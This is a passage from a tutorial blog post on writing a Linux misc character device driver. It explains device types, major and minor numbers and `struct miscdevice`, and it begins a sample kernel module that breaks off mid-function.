<text text-anchor='middle' x='32' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='180' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='96' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='96' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='96' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='96' y='244' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='96' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='104' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='84' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='104' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='212' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='120' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='128' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='324' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='128' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='356' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='212' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='136' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='212' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='144' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='152' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='212' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='152' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='168' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>┼</text>
<text text-anchor='middle' x='168' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='180' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='168' y='244' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='168' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='292' fill='currentColor' style='font-size:1em'>┼</text>
<text text-anchor='middle' x='168' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='324' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='168' y='340' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='168' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='212' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='340' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='176' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='184' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='212' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='212' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='192' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='212' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='200' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='208' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='212' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='324' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='216' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='356' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='84' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='180' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='240' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='244' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='240' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='52' fill='currentColor' style='font-size:1em'>U</text>
<text text-anchor='middle' x='352' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='340' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='360' y='52' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='360' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='212' fill='currentColor' style='font-size:1em'>K</text>
<text text-anchor='middle' x='360' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='340' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='368' y='52' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='368' y='212' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='368' y='340' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='376' y='52' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='376' y='212' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='376' y='340' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='384' y='52' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='384' y='212' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='384' y='340' fill='currentColor' style='font-size:1em'>W</text>
<text text-anchor='middle' x='392' y='52' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='392' y='212' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='392' y='340' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='400' y='212' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='400' y='340' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='408' y='52' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='408' y='340' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='416' y='52' fill='currentColor' style='font-size:1em'>E</text>
</g>

    </svg>
  
</div>
<p>Now we know what are device drivers and how do they fit in the bigger picture. But that&rsquo;s not all!</p>
<p>In linux, these device drivers are usually implemented as kernel modules, that provides an interface between the actual hardare device and the userspace &ldquo;<a href="https://www.kernel.org/doc/html/latest/filesystems/vfs.html">files</a>&rdquo;. On the basis of speed, volume and way of organizing the data to be transfered from userspace to the device and vice versa, device drivers are categorized under 2 types. <em>(Note:- There is one more type of device called network device, but for this article it&rsquo;s better to not start discussing about those)</em></p>
<ol>
<li>Character devices (Slow and manages small amount of data; used for keyboards, mouse, etc)</li>
<li>Block devices (Fast and can manage bulk data with ease and efficiency; used mainly for storage devices)</li>
</ol>
<p>A typical linux <code>ls -l</code> command gives us a lot of information about the kind of device each file is.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -l /dev
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Output (snipped)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># lrwxrwxrwx  1 root root          3    Sep 16 19:56 cdrom -&gt; sr0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># brw-rw----  1 root disk        8,0    Sep 16 19:56 sda</span>
</span></span><span class="line"><span class="cl"><span class="c1"># brw-rw----  1 root disk        8,1    Sep 16 19:56 sda1</span>
</span></span><span class="line"><span class="cl"><span class="c1"># brw-rw----  1 root disk        8,2    Sep 16 19:56 sda2</span>
</span></span><span class="line"><span class="cl"><span class="c1"># brw-rw----+ 1 root optical    11,0    Sep 16 19:56 sr0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># crw--w----  1 root tty         4,0    Sep 16 19:56 tty0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># crw-rw-rw-  1 root root        1,5    Sep 16 19:56 zero</span>
</span></span></code></pre></div><p>First character of each line from the above output gives the type of the file it is, for example:</p>
<ul>
<li><code>l</code> indicates that the file is a link file.</li>
<li><code>b</code> is the indicator for block device.</li>
<li><code>c</code> is for the character device.</li>
</ul>
<p>Another important thing this gives out are unique identifiers associated with each device. These identifiers consists of <strong>two comma separated numbers</strong> - <code>major number</code> and <code>minor number</code>.</p>
<p>Major number tells about the driver associated with the device. In the output above, <code>sda</code>, <code>sda1</code> and <code>sda2</code> all are managed by driver <code>8</code>. The kernel uses the major number at open time to dispatch execution to the appropriate driver. While the minor number is used by driver (specified by major number) to differentiate among multiple devices handled by the driver.</p>
<p>If you wish to read more about this, here is a <a href="https://www.oreilly.com/library/view/linux-device-drivers/0596000081/ch03s02.html">good article about major and minor numbers.</a><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<p>At this point we can take a guess that these numbers are not random numbers, but they have a meaning to it. <a href="https://www.kernel.org/doc/html/latest/admin-guide/devices.html">Here</a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> is the official registry of allocated devices numbers which we will have to keep in mind before writing a device driver.</p>
<h3 id="what-is-a-misc-char-device-driver">What is a misc char device driver??</h3>
<p>Well, it&rsquo;s quite clear, isn&rsquo;t it? A Misc driver is a driver that is used for miscellaneous devices. 🤭🤭</p>
<p>They mostly behave like a char drivers, but they are unique in that we don&rsquo;t need to worry about all the complicated number registration issues. We can simply write our driver module and assign it a static minor number or ask kernel to provide a dynamic minor number. All the misc devices have common major number <code>10</code>. And just like char device, it supports all the file operation calls like open, read, write, close and IOCTL.</p>
<p>This is quite useful when we want to write a basic driver for a simple functionality and save ourselves from the mess of allocating and registering a major number.</p>
<h4 id="your-first-misc-char-device-driver">Your first misc char device driver</h4>
<p>In linux kernel source, <code>struct miscdevice</code> is defined in <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/miscdevice.h#L79"><code>linux/miscdevice.h</code> file</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">miscdevice</span>  <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">minor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="o">*</span><span class="n">fops</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">list_head</span> <span class="n">list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">device</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">device</span> <span class="o">*</span><span class="n">this_device</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="k">struct</span> <span class="n">attribute_group</span> <span class="o">**</span><span class="n">groups</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">nodename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">umode_t</span> <span class="n">mode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>For this task, we will need only 3 members of the above struct.</p>
<ol>
<li><code>int minor</code>: To allocate the minor number, either static or dynamic.</li>
<li><code>const char *name</code>: To give the name to the device.</li>
<li><code>const struct file_operations *fops</code> : To allow custom file operations like read and write.</li>
</ol>
<p>This will allow us to write a basic module that will work as misc device driver that can be loaded and unloaded from the kernel. Create a file with name <code>misc_char_device_driver.c</code> and paste the below code in that.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// message formatting - optional
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define pr_fmt(fmt) KBUILD_MODNAME &#34;: &#34; fmt
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Device name
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define MISC_DEVICE_NAME &#34;eudyptula&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Misc Device structure
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">my_misc_device</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">MISC_DEVICE_NAME</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Entry point
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">hello_world_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_misc_device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Hello from module; Return %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Exit point
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">hello_world_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
